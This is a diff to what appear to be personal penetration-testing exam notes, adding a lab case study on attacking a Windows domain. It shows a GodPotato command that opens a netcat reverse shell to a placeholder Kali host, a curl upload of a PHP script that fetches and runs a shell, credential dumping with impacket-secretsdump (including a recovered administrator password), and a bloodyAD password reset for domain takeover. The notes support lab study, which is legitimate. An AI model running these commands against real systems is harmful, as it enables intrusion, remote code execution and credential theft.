@@ -1659,3 +1659,22 @@ Critical for fixing older exploits during the exam.
   ```powershell
   .\GodPotato-NET4.exe -cmd "nc64.exe [KALI_IP] [PORT] -e cmd.exe"
   ```
+
+### 14.5. Lab Case Study (CloudSync & LSA Secrets)
+- **CloudSync Execution (Linux -> Windows)**:
+  - *Scenario*: Windows Web Server syncs files from an unauthenticated S3-compatible Linux storage.
+  - *Method*: `PUT` a PHP download script on Linux to trigger execution on Windows.
+  ```bash
+  curl -X PUT http://100.130.140.168/storage/download.php --data-binary @download.php
+  # download.php downloads and executes the final shell from Kali.
+  ```
+- **LSA Secret Harvesting (DC Admin)**:
+  - *Tactic*: Check `_SC_SNMPTRAP` or other service secrets for service account credentials.
+  ```bash
+  impacket-secretsdump 'ocean.com'/'user1':'pass1'@100.130.140.171
+  # Result: ocean\administrator:BigFeast999!
+  ```
+- **Active Directory Escalation (GenericAll)**:
+  ```bash
+  bloodyAD -u 'user' -p 'pass' -d 'ocean.com' --host 100.130.140.169 set password 'target_user' 'NewPassword123!'
+  ```
